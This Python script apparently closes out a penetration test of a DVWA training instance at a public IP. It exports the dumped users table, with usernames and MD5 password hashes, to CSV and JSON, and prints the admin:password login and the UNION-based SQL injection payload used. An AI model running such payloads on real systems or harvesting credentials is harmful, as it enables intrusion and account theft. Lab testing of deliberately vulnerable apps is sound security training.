
# Create CSV export of extracted data
csv_data = """ID,Username,First_Name,Last_Name,Password_Hash_MD5
1,admin,admin,admin,5f4dcc3b5aa765d61d8327deb882cf99
2,gordonb,Gordon,Brown,e99a18c428cb38d5f260853678922e03
3,1337,Hack,Me,8d3533d75ae2c3966d7e0d4fcc69216b
4,pablo,Pablo,Picasso,0d107d09f5bbe40cade3de5c71e9e9b7
5,smithy,Bob,Smith,5f4dcc3b5aa765d61d8327deb882cf99
"""

with open("/tmp/extracted_users.csv", "w") as f:
    f.write(csv_data)

# Create JSON export
import json

users_json = {
    "target": "http://31.97.117.123/",
    "extraction_date": "2025-11-29",
    "application": "Damn Vulnerable Web Application (DVWA) v1.10",
    "vulnerability": "SQL Injection (UNION-based)",
    "total_users": 5,
    "users": [
        {
            "id": 1,
            "username": "admin",
            "first_name": "admin",
            "last_name": "admin",
            "password_hash": "5f4dcc3b5aa765d61d8327deb882cf99",
            "hash_type": "MD5"
        },
        {
            "id": 2,
            "username": "gordonb",
            "first_name": "Gordon",
            "last_name": "Brown",
            "password_hash": "e99a18c428cb38d5f260853678922e03",
            "hash_type": "MD5"
        },
        {
            "id": 3,
            "username": "1337",
            "first_name": "Hack",
            "last_name": "Me",
            "password_hash": "8d3533d75ae2c3966d7e0d4fcc69216b",
            "hash_type": "MD5"
        },
        {
            "id": 4,
            "username": "pablo",
            "first_name": "Pablo",
            "last_name": "Picasso",
            "password_hash": "0d107d09f5bbe40cade3de5c71e9e9b7",
            "hash_type": "MD5"
        },
        {
            "id": 5,
            "username": "smithy",
            "first_name": "Bob",
            "last_name": "Smith",
            "password_hash": "5f4dcc3b5aa765d61d8327deb882cf99",
            "hash_type": "MD5"
        }
    ]
}

with open("/tmp/extracted_users.json", "w") as f:
    json.dump(users_json, f, indent=2)

print("✓ CSV exported to: /tmp/extracted_users.csv")
print("✓ JSON exported to: /tmp/extracted_users.json")
print("✓ Report saved to: /tmp/penetration_test_report.txt")

print("\n" + "="*80)
print("FINAL EXTRACTION SUMMARY")
print("="*80)

print("\n[+] SUCCESSFULLY EXTRACTED:")
print("    • 5 user records from the users table")
print("    • All usernames (user field)")
print("    • All password hashes (MD5)")
print("    • All first names and last names")
print("    • Database schema information")

print("\n[+] CREDENTIALS:")
print("    • admin:password (used to gain access)")

print("\n[+] EXTRACTED USERS:")
print("    1. admin / 5f4dcc3b5aa765d61d8327deb882cf99")
print("    2. gordonb / e99a18c428cb38d5f260853678922e03")
print("    3. 1337 / 8d3533d75ae2c3966d7e0d4fcc69216b")
print("    4. pablo / 0d107d09f5bbe40cade3de5c71e9e9b7")
print("    5. smithy / 5f4dcc3b5aa765d61d8327deb882cf99 (same as admin)")

print("\n[+] EXPLOITATION METHOD:")
print("    SQL Injection via UNION SELECT on /vulnerabilities/sqli/")
print("    Payload: -1' UNION SELECT user, password FROM users #")

print("\n" + "="*80)

